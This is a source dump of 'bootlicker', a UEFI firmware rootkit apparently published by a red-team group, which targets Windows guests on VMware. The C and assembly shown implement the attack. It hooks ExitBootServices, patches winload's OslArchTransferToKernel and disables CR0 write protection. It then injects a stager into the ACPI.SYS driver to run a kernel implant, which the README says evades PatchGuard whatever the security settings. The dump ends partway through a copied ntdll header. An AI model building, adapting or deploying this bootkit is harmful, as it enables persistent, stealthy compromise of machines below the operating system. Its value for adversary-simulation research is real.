Project Path: arc_gmh5225_bootlicker_bti75st2

Source Tree:

```txt
arc_gmh5225_bootlicker_bti75st2
├── Makefile
├── README.h
├── README.md
├── SectionLink.ld
├── asm
│   └── x64
│       └── GetIp.asm
├── bootkit
│   ├── Common.h
│   ├── DrvMain.c
│   ├── DrvMain.h
│   ├── EfTbl.h
│   ├── EfiMain.c
│   ├── EfiMain.h
│   ├── ExitBootServices.c
│   ├── ExitBootServices.h
│   ├── Native.h
│   ├── OslArchTransferToKernel.c
│   └── OslArchTransferToKernel.h
├── core
│   ├── Common.h
│   ├── Hash.c
│   └── Pe.c
├── include
│   ├── ddk
│   │   ├── acpiioct.h
│   │   ├── afilter.h
│   │   ├── amtvuids.h
│   │   ├── ata.h
│   │   ├── atm.h
│   │   ├── bdasup.h
│   │   ├── classpnp.h
│   │   ├── csq.h
│   │   ├── d3dhal.h
│   │   ├── d3dhalex.h
│   │   ├── d4drvif.h
│   │   ├── d4iface.h
│   │   ├── dderror.h
│   │   ├── dmusicks.h
│   │   ├── drivinit.h
│   │   ├── drmk.h
│   │   ├── dxapi.h
│   │   ├── fltsafe.h
│   │   ├── hidclass.h
│   │   ├── hubbusif.h
│   │   ├── ide.h
│   │   ├── ioaccess.h
│   │   ├── kbdmou.h
│   │   ├── mcd.h
│   │   ├── mce.h
│   │   ├── miniport.h
│   │   ├── minitape.h
│   │   ├── mountdev.h
│   │   ├── mountmgr.h
│   │   ├── msports.h
│   │   ├── ndis.h
│   │   ├── ndisguid.h
│   │   ├── ndistapi.h
│   │   ├── ndiswan.h
│   │   ├── netpnp.h
│   │   ├── ntagp.h
│   │   ├── ntddk.h
│   │   ├── ntddpcm.h
│   │   ├── ntddsnd.h
│   │   ├── ntifs.h
│   │   ├── ntimage.h
│   │   ├── ntintsafe.h
│   │   ├── ntnls.h
│   │   ├── ntpoapi.h
│   │   ├── ntstrsafe.h
│   │   ├── oprghdlr.h
│   │   ├── parallel.h
│   │   ├── pfhook.h
│   │   ├── poclass.h
│   │   ├── portcls.h
│   │   ├── punknown.h
│   │   ├── scsi.h
│   │   ├── scsiscan.h
│   │   ├── scsiwmi.h
│   │   ├── smbus.h
│   │   ├── srb.h
│   │   ├── stdunk.h
│   │   ├── storport.h
│   │   ├── strmini.h
│   │   ├── swenum.h
│   │   ├── tdikrnl.h
│   │   ├── tdistat.h
│   │   ├── upssvc.h
│   │   ├── usbbusif.h
│   │   ├── usbdlib.h
│   │   ├── usbdrivr.h
│   │   ├── usbkern.h
│   │   ├── usbprint.h
│   │   ├── usbprotocoldefs.h
│   │   ├── usbscan.h
│   │   ├── usbstorioctl.h
│   │   ├── video.h
│   │   ├── videoagp.h
│   │   ├── wdm.h
│   │   ├── wdmguid.h
│   │   ├── wdmsec.h
│   │   ├── wmidata.h
│   │   ├── wmilib.h
│   │   ├── ws2san.h
│   │   └── xfilter.h
│   ├── global
│   │   ├── Config.h
│   │   ├── Hash.h
│   │   ├── Labels.h
│   │   ├── Macros.h
│   │   └── Pe.h
│   └── gnu-efi
│       ├── aarch64
│       │   ├── efibind.h
│       │   ├── efilibplat.h
│       │   └── efisetjmp_arch.h
│       ├── arm
│       │   ├── efibind.h
│       │   ├── efilibplat.h
│       │   └── efisetjmp_arch.h
│       ├── efi.h
│       ├── efi_nii.h
│       ├── efi_pxe.h
│       ├── efiapi.h
│       ├── eficompiler.h
│       ├── eficon.h
│       ├── eficonex.h
│       ├── efidebug.h
│       ├── efidef.h
│       ├── efidevp.h
│       ├── efierr.h
│       ├── efifs.h
│       ├── efigpt.h
│       ├── efiip.h
│       ├── efilib.h
│       ├── efilink.h
│       ├── efinet.h
│       ├── efipart.h
│       ├── efipciio.h
│       ├── efipoint.h
│       ├── efiprot.h
│       ├── efipxebc.h
│       ├── efirtlib.h
│       ├── efiser.h
│       ├── efisetjmp.h
│       ├── efishell.h
│       ├── efishellintf.h
│       ├── efistdarg.h
│       ├── efitcp.h
│       ├── efiudp.h
│       ├── efiui.h
│       ├── ia32
│       │   ├── efibind.h
│       │   ├── efilibplat.h
│       │   ├── efisetjmp_arch.h
│       │   └── pe.h
│       ├── ia64
│       │   ├── efibind.h
│       │   ├── efilibplat.h
│       │   ├── efisetjmp_arch.h
│       │   ├── pe.h
│       │   └── salproc.h
│       ├── inc.mak
│       ├── lib.h
│       ├── libsmbios.h
│       ├── make.inf
│       ├── makefile.hdr
│       ├── mips64el
│       │   ├── efibind.h
│       │   ├── efilibplat.h
│       │   └── efisetjmp_arch.h
│       ├── pci22.h
│       ├── protocol
│       │   ├── adapterdebug.h
│       │   ├── eficonsplit.h
│       │   ├── efidbg.h
│       │   ├── efivar.h
│       │   ├── ia64
│       │   │   └── eficontext.h
│       │   ├── intload.h
│       │   ├── legacyboot.h
│       │   ├── make.inf
│       │   ├── makefile.hdr
│       │   ├── piflash64.h
│       │   ├── readme.txt
│       │   └── vgaclass.h
│       ├── riscv64
│       │   ├── efibind.h
│       │   ├── efilibplat.h
│       │   └── efisetjmp_arch.h
│       ├── romload.h
│       └── x86_64
│           ├── efibind.h
│           ├── efilibplat.h
│           ├── efisetjmp_arch.h
│           └── pe.h
├── kernel
│   ├── ApcRoutine.c
│   ├── ApcRoutine.h
│   ├── Common.h
│   ├── KernelMain.c
│   ├── KmTbl.h
│   ├── ThreadNotifyRoutine.c
│   └── ThreadNotifyRoutine.h
├── obj
├── python3
│   ├── extract.py
│   ├── hashstring.py
│   └── inject.py
└── usermode
    ├── Common.h
    ├── Native.h
    └── UsermodeMain.c

```

`Makefile`:

```
CC_X64	:= x86_64-w64-mingw32-gcc

CFLAGS	:= $(CFLAGS) -Os -fno-asynchronous-unwind-tables -nostdlib 
CFLAGS 	:= $(CFLAGS) -fno-ident -fpack-struct=8 -falign-functions=1
CFLAGS  := $(CFLAGS) -s -ffunction-sections -falign-jumps=1 -w
CFLAGS	:= $(CFLAGS) -falign-labels=1 -fPIC -Wl,-TSectionLink.ld
LFLAGS	:= $(LFLAGS) -Wl,-s,--no-seh,--enable-stdcall-fixup

OUTX64	:= bootlicker.x64.exe
BINX64	:= bootlicker.x64.bin

USERSC	:= $(wildcard usermode/*.c)
USEROB	:= $(USERSC:%.c=%.o)

BOOTSC	:= $(wildcard bootkit/*.c)
BOOTOB	:= $(BOOTSC:%.c=%.o)

KERNSC	:= $(wildcard kernel/*.c)
KERNOB	:= $(KERNSC:%.c=%.o)

CORESC	:= $(wildcard core/*.c)
COREOB	:= $(CORESC:%.c=%.o)

##
## Build the bootlicker shellcode
##
all: $(BOOTOB) $(KERNOB) $(COREOB) $(USEROB)
	@ nasm -f win64 asm/x64/GetIp.asm -o obj/GetIp.x64.o
	@ $(CC_X64) $(CFLAGS) $(LFLAGS) obj/*.o -o $(OUTX64)
	@ python3 python3/extract.py -f $(OUTX64) -o $(BINX64)

##
## Build all the usermode object files
##
$(USEROB):
	@ $(CC_X64) -o obj/usermode_$(basename $(notdir $@)).o -c $(basename $@).c $(CFLAGS) -Iinclude

##
## Build all the bootkit object files
##
$(BOOTOB):
	@ $(CC_X64) -o obj/bootkit_$(basename $(notdir $@)).o -c $(basename $@).c $(CFLAGS) -Iinclude

##
## Build all the kernel object files
##
$(KERNOB):
	@ $(CC_X64) -o obj/kernel_$(basename $(notdir $@)).o -c $(basename $@).c $(CFLAGS) -Iinclude -Iinclude/ddk

##
## Build all the core object files
##
$(COREOB):
	@ $(CC_X64) -o obj/core_$(basename $(notdir $@)).o -c $(basename $@).c $(CFLAGS) -Iinclude

clean:
	rm -rf obj/*.o
	rm -rf *.exe
	rm -rf *.bin

```

`README.h`:

```h
/*!
 *
 * BOOTLICKER
 *
 * GuidePoint Security LLC
 *
 * Threat and Attack Simulation Team
 *
!*/

```

`README.md`:

```md
# About

bootlicker is a legacy, extensible UEFI firmware rootkit targeting vmware hypervisor virtual machines. It is designed to achieve initial code execution within the context of the windows kernel, regardless of security settings configured.

## Architecture

![](https://i.imgur.com/ONRLJZe.png)

vmvware-bootkit takes its design from the legacy CosmicStrain, MoonBounce, and ESPECTRE rootkits to achive arbitrary code excution without triggering patchguard or other related security mechanisms.

After initial insertion into a UEFI driver firmware using the the [injection utility](scripts/inject.py), the shellcodes [EfiMain](bootkit/EfiMain.c) achieves execution as the host starts up, and inserts a hook into the UEFI firmware's [ExitBootServices routine](bootkit/ExitBootServices.c). The ExitBootServices routine will then, on execution, find the source caller of the function, and if it matches WinLoad.EFI, attempts to find the unexported winload.efi!OslArchTransferToKernel routine, which will allow us to attack the booting kernel before it achieves its initial execution.

Once [OslArchTransferToKernel](bootkit/OslArchTransferToKernel.c) executes, it will search for the ACPI.SYS driver, find the `.rsrc` PE section, and inject a small stager shellcode entrypoint called [DrvMain](bootkit/DrvMain.c) to copy over a larger payload that will act as our kernel implant.

```

`SectionLink.ld`:

```ld
SECTIONS
{
	.text :
	{
		*( .text$A )
		*( .text$B )
		*( .text$C )
		*( .text$D )
		*( .text$E )
		*( .text$F )
		*( .rdata* )
		*( .text$G )
		*( .text$H )
		*( .text$I )
	}
}

```

`asm/x64/GetIp.asm`:

```asm
;;
;; BOOTLICKER
;;
;; GuidePoint Security LLC
;;
;; Threat and Attack Simulation Team
;;
[BITS 64]

;;
;; Export
;;
GLOBAL	EfClg
GLOBAL	EfTbl
GLOBAL	GetIp
GLOBAL	KmEnt
GLOBAL	UmEnt
GLOBAL	UmTbl
GLOBAL	KmTbl

;;
;; Import
;;
EXTERN	KernelMain
EXTERN	UsermodeMain

;;
;; Section
;;
[SECTION .text$C]

;;
;; Purpose:
;;
;; Kernel shellcode entrypoint
;;
KmEnt:
	jmp	KernelMain


;;
;; Section
;;
[SECTION .text$E]

;;
;; Purpose:
;;
;; Usermode shellcode entrypoint
;;
UmEnt:
	;;
	;; Push all the registers
	;;
	jmp	UsermodeMain

;;
;; Purpose:
;;
;; Stores information for the usermode shellcode
;;
UmTbl:
	dq	0

;;
;; Section
;;
[SECTION .text$I]

;;
;; Purpose:
;;
;; Stores information for the kernel shellcode
;;
KmTbl:
	dq	0
	dd	0

;;
;; Purpose:
;; 
;; Stores the hooked prologue for OslArchTransferToKernel
;;
EfClg:
	resb	16
	resb	14

;;
;; Purpose:
;; 
;; Stores information for the bootkit
;;
EfTbl:
	;; ExitBootServicesHook / OslArchTransferToKernelHook
	dq	0
	dq	0

	;; DrvMain
	dq	0
	dd	0
	dq	0
	dq	0
	dq	0
	dq	0
	dd	0

;;
;; Purpose:
;;
;; Returns a pointer to itself.
;;
GetIp:
	;;
	;; Execute next instruction
	;;
	call	get_ret_ptr

	get_ret_ptr:
	;;
	;; Subtract the diference between
	;; get_ret_ptr and GetIp stub
	;;
	pop	rax
	sub	rax, 5

	;;
	;; Return pointer to GetIp
	;;
	ret

;;
;; End of code stub
;;
Leave:
	db 'ENDOFCODE'

```

`bootkit/Common.h`:

```h
/*!
 *
 * BOOTLICKER
 *
 * GuidePoint Security LLC
 *
 * Threat and Attack Simulation Team
 *
!*/

#pragma once

#include <windows.h>
#include <intrin.h>
#include "global/Labels.h"
#include "global/Macros.h"
#include "global/Config.h"
#include "global/Hash.h"
#include "global/Pe.h"
#include "gnu-efi/efi.h"

#include "OslArchTransferToKernel.h"
#include "ExitBootServices.h"
#include "DrvMain.h"
#include "EfiMain.h"
#include "Native.h"
#include "EfTbl.h"

```

`bootkit/DrvMain.c`:

```c
/*!
 *
 * BOOTLICKER
 *
 * GuidePoint Security LLC
 *
 * Threat and Attack Simulation Team
 *
!*/

#include "Common.h"

VOID
NTAPI
KeSetSystemAffinityThread(
	_In_ SIZE_T Affinity
);

PVOID
NTAPI
ExAllocatePool(
	_In_ SIZE_T PoolType,
	_In_ SIZE_T NumberOfBytes
);

VOID
NTAPI
MmUnmapIoSpace(
	_In_ LPVOID BaseAddress,
	_In_ SIZE_T NumberOfBytes
);

PVOID
NTAPI
MmMapIoSpace(
	_In_ LPVOID PhysicalAddress,
	_In_ SIZE_T NumberOfBytes,
	_In_ SIZE_T CacheType
);

typedef struct
{
	D_API( KeSetSystemAffinityThread );
	D_API( ExAllocatePool );
	D_API( MmUnmapIoSpace );
	D_API( MmMapIoSpace );
} API ;

/* API Hashes */
#define H_API_KESETSYSTEMAFFINITYTHREAD		0x80679c78 /* KeSetSystemAffinityThread */
#define H_API_EXALLOCATEPOOL			0xa1fe8ce1 /* ExAllocatePool */
#define H_API_MMUNMAPIOSPACE			0xf2610ec4 /* MmUnmapIoSpace */
#define H_API_MMMAPIOSPACE			0x7fbf0801 /* MmMapIoSpace */

/*!
 *
 * Purpose:
 *
 * Copies over a larger kernel shellcode and injects
 * it into the host memory.
 *
!*/
D_SEC( G ) NTSTATUS NTAPI DrvMain( _In_ PVOID DriverObject, _In_ PVOID RegistryPath )
{
	API			Api;

	ULONG			Ofs = 0;

	PVOID			Fcn = NULL;
	PVOID			Phy = NULL;
	PEFTBL			Eft = NULL;
	PIMAGE_DOS_HEADER	Dos = NULL;
	PIMAGE_NT_HEADERS	Nth = NULL;
	PIMAGE_SECTION_HEADER	Sec = NULL;
	PLDR_DATA_TABLE_ENTRY	Ldr = NULL;

	/* Zero out stack structures */
	RtlSecureZeroMemory( &Api, sizeof( Api ) );

	/* Get efi table */
	Eft = C_PTR( G_PTR( EfTbl ) );
	Dos = C_PTR( U_PTR( Eft->TgtDrvImgBase ) );
	Nth = C_PTR( U_PTR( Dos ) + Dos->e_lfanew );
	Ldr = C_PTR( U_PTR( Eft->TgtDrvLdrEntry ) );
	Sec = C_PTR( U_PTR( Eft->TgtDrvImgSect ) );

	/* Get functions */
	Api.KeSetSystemAffinityThread = PeGetFuncEat( Eft->KernelBase, H_API_KESETSYSTEMAFFINITYTHREAD );
	Api.ExAllocatePool            = PeGetFuncEat( Eft->KernelBase, H_API_EXALLOCATEPOOL );
	Api.MmUnmapIoSpace            = PeGetFuncEat( Eft->KernelBase, H_API_MMUNMAPIOSPACE );
	Api.MmMapIoSpace              = PeGetFuncEat( Eft->KernelBase, H_API_MMMAPIOSPACE );

	/* Map the physical memory */
	if ( ( Phy = Api.MmMapIoSpace( Eft->KernelBuf, Eft->KernelLen, 0 ) ) != NULL ) {
		/* Allocate a nonpaged pool to execute over */
		if ( ( Fcn = Api.ExAllocatePool( 0 /* NonPaged */, Eft->KernelLen ) ) != NULL ) {

			/* Copy over the buffer */
			__builtin_memcpy( Fcn, Phy, Eft->KernelLen );

			/* Get KernelMain() addr */
			Ofs = U_PTR( G_PTR( KmEnt ) ) - U_PTR( G_PTR( EfiMain ) );
			Fcn = C_PTR( U_PTR( Fcn ) + Ofs );

			/* Execute KernelMain( KernelBase ); */
			( ( VOID NTAPI ( * )( PVOID, PVOID ) ) Fcn )( Eft->KernelBase, Eft->TgtDrvImgBase );
		};
		/* Unmap the memory */
		Api.MmUnmapIoSpace( Phy, Eft->KernelLen );
	};

	/* Force to 1 CPU */
	Api.KeSetSystemAffinityThread( 1 );

	/* Remove write protection */
	__writecr0( __readcr0() &~ 0x000010000 );

	/* Fix the section permissions */
	Sec->Characteristics &= IMAGE_SCN_MEM_EXECUTE;

	/* Fix the entrypoint */
	Ldr->EntryPoint = C_PTR( U_PTR( Dos ) + U_PTR( Eft->TgtDrvAddressOfEntrypoint ) );

	/* Fix the image header */
	Nth->OptionalHeader.AddressOfEntryPoint = Eft->TgtDrvAddressOfEntrypoint;

	/* Insert write protection */
	__writecr0( __readcr0() | 0x000010000 );

	/* Zero out stack structures */
	RtlSecureZeroMemory( &Api, sizeof( Api ) );

	/* Execute original driver entrypoint */
	return ( ( __typeof__( DrvMain ) * ) C_PTR( U_PTR( Eft->TgtDrvImgBase ) + Eft->TgtDrvAddressOfEntrypoint ) )(
			DriverObject, RegistryPath
	);
};

```

`bootkit/DrvMain.h`:

```h
/*!
 *
 * BOOTLICKER
 *
 * GuidePoint Security LLC
 *
 * Threat and Attack Simulation Team
 *
!*/

#pragma once

/*!
 *
 * Purpose:
 *
 * Copies over a larger kernel shellcode and injects
 * it into the host memory.
 *
!*/
D_SEC( G ) NTSTATUS NTAPI DrvMain( _In_ PVOID DriverObject, _In_ PVOID RegistryPath );

```

`bootkit/EfTbl.h`:

```h
/*!
 *
 * BOOTLICKER
 *
 * GuidePoint Security LLC
 *
 * Threat and Attack Simulation Team
 *
!*/

#pragma once

typedef struct __attribute__(( packed ))
{
	// ExitBootServicesHook / OslArchTransferToKernelHook
	EFI_EXIT_BOOT_SERVICES		ExitBootServices;
	PVOID				OslArchTransferToKernelGate;

	// DrvMain
	PVOID				KernelBuf;
	ULONG				KernelLen;
	PVOID				KernelBase;
	PVOID				TgtDrvImgSect;
	PVOID				TgtDrvImgBase;
	PVOID				TgtDrvLdrEntry;
	ULONG				TgtDrvAddressOfEntrypoint;
} EFTBL, *PEFTBL;

```

`bootkit/EfiMain.c`:

```c
/*!
 *
 * BOOTLICKER
 *
 * GuidePoint Security LLC
 *
 * Threat and Attack Simulation Team
 *
!*/

#include "Common.h"

/*!
 *
 * Purpose:
 *
 * Entrypoint for the BOOTLICKER. Wipes the DMAR
 * table to prevent Virtualized-Based-Security from
 * being initialized, copies itself to a new region
 * of memory, and sets a hook into the method table
 * of ExitBootServices.
 *
!*/
D_SEC( A ) EFI_STATUS EFIAPI EfiMain( _In_ EFI_HANDLE ImageHandle, _In_ EFI_SYSTEM_TABLE * SystemTable )
{
	SIZE_T			Len = 0;
	SIZE_T			Pct = 0;
	EFI_PHYSICAL_ADDRESS	Epa = 0;

	PEFTBL			Eft = NULL;
	PCONFIG			Cfg = NULL;
	PIMAGE_DOS_HEADER	Dos = NULL;
	PIMAGE_NT_HEADERS	Nth = NULL;

	/* Calculate the complete length of the current shellcode */
	Len = ( U_PTR( GetIp() ) + 11 ) - U_PTR( G_PTR( EfiMain ) );

	/* Calculate the number of pages needed for the allocation */
	Pct = ( ( ( Len + 0x1000 - 1 ) &~ ( 0x1000 - 1 ) ) / 0x1000 );

	/* Allocate the pages for the shellcode */
	if ( SystemTable->BootServices->AllocatePages( AllocateAnyPages, EfiRuntimeServicesData, Pct, &Epa ) == EFI_SUCCESS ) {

		/* Save a copy of the handler */
		Eft = C_PTR( G_PTR( EfTbl ) );
		Eft->ExitBootServices = C_PTR( SystemTable->BootServices->ExitBootServices );

		/* Copy over the shellcode */
		__builtin_memcpy( C_PTR( Epa ), C_PTR( G_PTR( EfiMain ) ), Len );

		/* Insert hooks into the handler */
		SystemTable->BootServices->ExitBootServices = C_PTR( U_PTR( Epa ) + ( G_PTR( ExitBootServicesHook ) - G_PTR( EfiMain ) ) );
	};

	if ( ImageHandle != NULL ) {
		/* Locate the 'Leave' symbol @ GetIp */
		Cfg = C_PTR( U_PTR( GetIp() ) + 11 );

		/* Get the EfiMain symbol */
		Dos = C_PTR( G_PTR( EfiMain ) );
		Dos = C_PTR( U_PTR( U_PTR( Dos ) &~ ( 0x20 - 1 ) ) );

		do 
		{
			/* Has the MZ Stub? */
			if ( Dos->e_magic == IMAGE_DOS_SIGNATURE ) {
				/* Patch the specified e_lfanew? */
				if ( Dos->e_lfanew == Cfg->AddressOfNewExeHeader ) {
					/* Get a pointer to the NT header */
					Nth = C_PTR( U_PTR( Dos ) + Dos->e_lfanew );

					/* Is our NT header? */
					if ( Nth->Signature == IMAGE_NT_SIGNATURE ) {
						/* Yes! Abort! */
						break;
					};
				};
			};
			/* Decrement */
			Dos = C_PTR( U_PTR( Dos ) - 0x20 );
		} while ( TRUE );

		/* Execute EfiMain of the infected file */
		return ( ( __typeof__( EfiMain ) * ) C_PTR( U_PTR( Dos ) + Cfg->AddressOfEntrypoint ) )(
				ImageHandle, SystemTable
		);
	};
	return EFI_SUCCESS;
};

```

`bootkit/EfiMain.h`:

```h
/*!
 *
 * BOOTLICKER
 *
 * GuidePoint Security LLC
 *
 * Threat and Attack Simulation Team
 *
!*/

#pragma once

/*!
 *
 * Purpose:
 *
 * Entrypoint for the BOOTLICKER. Wipes the DMAR
 * table to prevent Virtualized-Based-Security from
 * being initialized, copies itself to a new region
 * of memory, and sets a hook into the method table
 * of ExitBootServices.
 *
!*/
D_SEC( A ) EFI_STATUS EFIAPI EfiMain( _In_ EFI_HANDLE ImageHandle, _In_ EFI_SYSTEM_TABLE * SystemTable );

```

`bootkit/ExitBootServices.c`:

```c
/*!
 *
 * BOOTLICKER
 *
 * GuidePoint Security LLC
 *
 * Threat and Attack Simulation Team
 *
!*/

#include "Common.h"

/*!
 *
 * Purpose:
 *
 * Inserts a hook into OslArchTransferToKernel.
 *
!*/
D_SEC( B ) EFI_STATUS EFIAPI ExitBootServicesHook( EFI_HANDLE ImageHandle, UINTN Key )
{
	SIZE_T			Osl = 0;

	PVOID			Osp = NULL;
	PEFTBL			Eft = NULL;
	PUINT8			Ptr = NULL;
	PIMAGE_DOS_HEADER	Dos = NULL;
	PIMAGE_NT_HEADERS	Nth = NULL;
	PIMAGE_SECTION_HEADER	Sec = NULL;
	PIMAGE_DATA_DIRECTORY	Dir = NULL;
	PIMAGE_EXPORT_DIRECTORY	Exp = NULL;

	/* Get pointer to EFI Table */
	Eft = C_PTR( G_PTR( EfTbl ) );

	/* Find the return address and align it to the bottom of the page */
	Dos = C_PTR( __builtin_extract_return_addr( __builtin_return_address( 0 ) ) );
	Dos = C_PTR( U_PTR( U_PTR( Dos ) &~ ( 0x1000 - 1 ) ) );

	do 
	{
		/* Is this the MZ magic? */
		if ( Dos->e_magic == IMAGE_DOS_SIGNATURE ) {
			if ( Dos->e_lfanew < 0x100 ) {
				/* Get NT header */
				Nth = C_PTR( U_PTR( Dos ) + Dos->e_lfanew );

				if ( Nth->Signature == IMAGE_NT_SIGNATURE ) {
					/* Abort */
					break;
				};
			};
		};
		/* Decrement */
		Dos = C_PTR( U_PTR( Dos ) - 0x1000 );
	} while ( TRUE );

	/* Get pointer to the export table data directory */
	Dir =  & Nth->OptionalHeader.DataDirectory[ IMAGE_DIRECTORY_ENTRY_EXPORT ];

	if ( Dir->VirtualAddress ) {
		/* Get pointer to the export address table */
		Exp = C_PTR( U_PTR( Dos ) + Dir->VirtualAddress );

		/* Is our target boot services driver? */
		if ( HashString( C_PTR( U_PTR( Dos ) + Exp->Name ), 0 ) == 0x8deb5a3a ||
		     HashString( C_PTR( U_PTR( Dos ) + Exp->Name ), 0 ) == 0x64255bfd ||
		     HashString( C_PTR( U_PTR( Dos ) + Exp->Name ), 0 ) == 0x64259d80 ) 
		{
			/* Get PE Section header */
			Sec = IMAGE_FIRST_SECTION( Nth );

			/* Enumerate all PE Sections */
			for ( INT Idx = 0 ; Idx < Nth->FileHeader.NumberOfSections ; ++Idx ) {
				/* Is this .text section? */
				if ( HashString( & Sec[ Idx ].Name, 0 ) == 0x0b6ea858 ) {
					for ( INT Jdx = 0 ; Jdx < Sec[ Idx ].SizeOfRawData ; ++Jdx ) {
						/* Get a pointer to the current instruction */
						Ptr = C_PTR( U_PTR( Dos ) + Sec[ Idx ].VirtualAddress + Jdx );

						/* OslArchTransferToKernel Signature x1 */
						if ( Ptr[ 0x00 ] == 0x33 && Ptr[ 0x01 ] == 0xf6 &&
						     Ptr[ 0x15 ] == 0x48 && Ptr[ 0x16 ] == 0x8d && Ptr[ 0x17 ] == 0x05 &&
						     Ptr[ 0x1c ] == 0x48 && Ptr[ 0x1d ] == 0x8d && Ptr[ 0x1e ] == 0x0d &&
						     Ptr[ 0x23 ] == 0x0f && Ptr[ 0x24 ] == 0x01 && Ptr[ 0x25 ] == 0x10 &&
						     Ptr[ 0x26 ] == 0x0f && Ptr[ 0x27 ] == 0x01 && Ptr[ 0x28 ] == 0x19 )
						{
							Osp = C_PTR( Ptr );
							Osl = 14;
							break;
						};

						/* OslArchTransferToKernel Signature x2 */
						if ( Ptr[ 0x00 ] == 0x33 && Ptr[ 0x01 ] == 0xf6 &&
						     Ptr[ 0x17 ] == 0x48 && Ptr[ 0x18 ] == 0x8d && Ptr[ 0x19 ] == 0x05 &&
						     Ptr[ 0x1e ] == 0x48 && Ptr[ 0x1f ] == 0x8d && Ptr[ 0x20 ] == 0x0d &&
						     Ptr[ 0x25 ] == 0x0f && Ptr[ 0x26 ] == 0x01 && Ptr[ 0x27 ] == 0x10 &&
						     Ptr[ 0x28 ] == 0x0f && Ptr[ 0x29 ] == 0x01 && Ptr[ 0x2a ] == 0x19 )
						{
							Osp = C_PTR( Ptr );
							Osl = 16;
							break;
						};

						/* Note: Add x86 signatures here if you want x86 support */
					};
					/* .text is found */
					break;
				};
			};
			/* Has the pointer to the function? */
			if ( Osp != NULL ) {
				/* Copy over the callgate. */
				__builtin_memcpy( C_PTR( G_PTR( EfClg ) ), Osp, Osl );

				/* Insert hook into OslArchTransferToKernel */
				*( PUINT16 )( C_PTR( U_PTR( Osp ) + 0x00 ) ) = ( UINT16 )( 0x25FF );
				*( PUINT32 )( C_PTR( U_PTR( Osp ) + 0x02 ) ) = ( UINT32 )( 0 );
				*( PUINT64 )( C_PTR( U_PTR( Osp ) + 0x06 ) ) = ( UINT64 )( C_PTR( G_PTR( OslArchTransferToKernelHook ) ) );

				/* Insert jump callgate */
				*( PUINT16 )( C_PTR( U_PTR( G_PTR( EfClg ) ) + Osl + 0x00 ) ) = ( UINT16 )( 0x25FF );
				*( PUINT32 )( C_PTR( U_PTR( G_PTR( EfClg ) ) + Osl + 0x02 ) ) = ( UINT32 )( 0 );
				*( PUINT64 )( C_PTR( U_PTR( G_PTR( EfClg ) ) + Osl + 0x06 ) ) = ( UINT64 )( C_PTR( U_PTR( Osp ) + Osl ) );

				/* Store the callgate address */
				Eft->OslArchTransferToKernelGate = C_PTR( G_PTR( EfClg ) );
			};
		};
	};
	/* Execute original function */
	return Eft->ExitBootServices( ImageHandle, Key );
};

```

`bootkit/ExitBootServices.h`:

```h
/*!
 *
 * BOOTLICKER
 *
 * GuidePoint Security LLC
 *
 * Threat and Attack Simulation Team
 *
!*/

#pragma once

/*!
 *
 * Purpose:
 *
 * Inserts a hook into OslArchTransferToKernel.
 *
!*/
D_SEC( B ) EFI_STATUS EFIAPI ExitBootServicesHook( EFI_HANDLE ImageHandle, UINTN Key );

```

`bootkit/Native.h`:

```h
/*
	ntdll.h
	User Mode, 32bit & 64bit version
	Visual Studio 6.0 - Visual Studio 2010 and MingW compatible
	Intel C++ Compiler (ICL) 11.x - 12.x prefered

	(c) 2019 - Rokas Kupstys
	(c) 2009, 2010, 2011 - Fyyre
	(c) 2011 - 2012 EP_X0FF
	(c) 2011 - rndbit

	version 1.26 ( increment this if changes has global effect )
	please mark your changes date begin / date end comments

	last change 04/01/2012

	note: Please use _M_X86/_M_X64 for if(n)def/endif conditionals, instead of WIN32/WIN64.
*/

#if !defined(_NTDLL_)
#define _NTDLL_

#pragma warning( disable:4001 )	// level 4 error - nonstandard extension 'single line comment' was used
#pragma warning( disable:4201 )	// level 4 error - nonstandard extension used : nameless struct/union - ANSI C violation
#pragma warning( disable:4214 ) // level 4 error - nonstandard extension used : bit field types other than int - ANSI C violation

#if defined(__ICL)
#pragma warning ( disable : 344 )
#endif

#pragma pack( push, 8 )

#if defined(__cplusplus)
extern "C" {
#endif

#include <wtypes.h>
#include <basetsd.h>

#if !defined(NTSTATUS)
typedef LONG NTSTATUS;
typedef NTSTATUS *PNTSTATUS;
#endif

#if !defined(SECURITY_STATUS)
typedef LONG SECURITY_STATUS;
#endif

#define EXPORT_FN __declspec(dllexport)
#define IMPORT_FN __declspec(dllimport)

#define PAGE_SIZE 0x1000

#define EXTERNAL extern "C"

#ifndef UNREFERENCED_PARAMETER
#define UNREFERENCED_PARAMETER(P)	(P)
#endif

#include "ntstatus.h"

#define NT_SUCCESS(Status) ((NTSTATUS)(Status) >= 0)
#define NT_INFORMATION(Status) ((ULONG)(Status) >> 30 == 1)
#define NT_WARNING(Status) ((ULONG)(Status) >> 30 == 2)
#define NT_ERROR(Status) ((ULONG)(Status) >> 30 == 3)

#define ABSOLUTE_TIME(wait) (wait)
#define RELATIVE_TIME(wait) (-(wait))
#define NANOSECONDS(nanos)      \
    (((signed __int64)(nanos)) / 100L)
#define MICROSECONDS(micros)    \
    (((signed __int64)(micros)) * NANOSECONDS(1000L))
#define MILLISECONDS(milli)     \
    (((signed __int64)(milli)) * MICROSECONDS(1000L))
#define SECONDS(seconds)        \
    (((signed __int64)(seconds)) * MILLISECONDS(1000L))

#define ARGUMENT_PRESENT(ArgumentPointer)    (\
	(CHAR *)((ULONG_PTR)(ArgumentPointer)) != (CHAR *)(NULL) )

#define RESTORE_LIST(ListEntry) \
	ListEntry.Flink = ListEntry.Flink; \
	ListEntry.Blink = ListEntry.Blink

#define UNLINK(x) (x).Blink->Flink = (x).Flink; \
	(x).Flink->Blink = (x).Blink;

#define ALIGN_TO_POWER2( x, n ) (((ULONG)(x) + ((n)-1)) & ~((ULONG)(n)-1))

#define POI(addr) *(ULONG *)(addr)

#define IS_PATH_SEPARATOR(ch) ((ch == '\\') || (ch == '/'))
#define IS_DOT(s) ( s[0] == '.' && ( IS_PATH_SEPARATOR(s[1]) || s[1] == '\0') )
#define IS_DOT_DOT(s) ( s[0] == '.' && s[1] == '.' && ( IS_PATH_SEPARATOR(s[2]) || s[2] == '\0') )

#define IS_PATH_SEPARATOR_U(ch) ((ch == (WCHAR)'\\') || (ch == (WCHAR)'/'))
#define IS_DOT_U(s) ( s[0] == (WCHAR)'.' && ( IS_PATH_SEPARATOR_U(s[1]) || s[1] == UNICODE_NULL) )
#define IS_DOT_DOT_U(s) ( s[0] == (WCHAR)'.' && s[1] == (WCHAR)'.' && ( IS_PATH_SEPARATOR_U(s[2]) || s[2] == UNICODE_NULL) )

#define jmp_length(y,x) ((x-y)-5)
#define stc_jc(y,x) ((x-y)-7)

